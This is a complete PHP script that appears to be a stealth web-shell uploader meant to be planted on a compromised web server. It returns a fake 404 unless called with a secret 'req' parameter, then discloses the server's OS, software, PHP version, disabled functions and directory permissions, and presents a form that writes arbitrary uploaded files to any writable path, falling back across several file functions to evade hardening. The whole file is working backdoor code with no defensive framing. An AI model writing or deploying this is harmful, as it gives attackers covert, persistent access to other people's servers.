<?php
/* usage: uploader.php?req */
if(isset($_GET['req'])){
	error_reporting(0);
	@ini_set('output_buffering', 0);
	$chunk_size = 4096;
	function disFunc(){
		$disfunc = @ini_get('disable_functions');	
		return !empty($disfunc) ? explode(',', $disfunc) : array();
	}
	function fupload($file, $path){
		$files = $file['name'];
		$dest = $path.'/'.$files;
		$outs = '';
		if(is_writable($path)){
			if(file_exists($dest)){@unlink($dest);}
			if(!in_array('move_uploaded_file', disFunc())){
				$errs[] = @move_uploaded_file($file['tmp_name'], $dest) ? 'file uploaded!' : 'upload failed!';
			} else if(!in_array('copy', disFunc())){
				$errs[] = @copy($file['tmp_name'], $dest) ? 'file uploaded!' : 'upload failed!';
			} else if(count(array_diff(disFunc(), array('file_put_contents', 'file_get_contents'))) == 0){
				$errs[] = @file_put_contents($dest, @file_get_contents($file['tmp_name'])) ? 'file uploaded!' : 'upload failed!';
			} else {
				$errs[] = 'upload failed!';
			}
			if(isset($errs)){
				$outs .= implode(', ', $errs);
			}
		} else {
			$outs .= 'gak bisa upload file di direktori ini!';
		}
		return '<pre>'.$outs.'</pre>';
	}
	$xpath = dirname(__FILE__);
	$os = !empty(@php_uname()) ? @php_uname() : 'Unknown';
	$sf = $_SERVER['SERVER_SOFTWARE'];
	$df = count(disFunc())>0 ? implode(', ', disFunc()) : 'NONE';
	$outs = "<pre><b>OS:</b> {$os}<br/><b>SOFTWARE:</b> {$sf}<br/><b>PHP_VERSION:</b> ".phpversion()."<br/><b>DISABLE_FUNCTION:</b> {$df}<br/><b>DIR_PERMISSIONS:</b> ".substr(sprintf("%o", @fileperms($xpath)),-4)."</pre>";
	$outs .= "<hr/>";
	$outs .= "<pre><form action='' method='post' enctype='multipart/form-data' name='uploader' id='uploader'><b>PATH:</b> <input type='text' name='path' value='{$xpath}' size='35px'></input> <input type='file' name='f'/><input type='submit' name='_upl' value='Upload'/></form></pre>";
	if(isset($_POST['_upl']) && $_POST['_upl'] == 'Upload'){
		$outs .= fupload($_FILES['f'], $_POST['path']);
	}
	echo $outs;
	die();
} else {
	header("HTTP/1.0 404 Not Found");
	die();
}
?>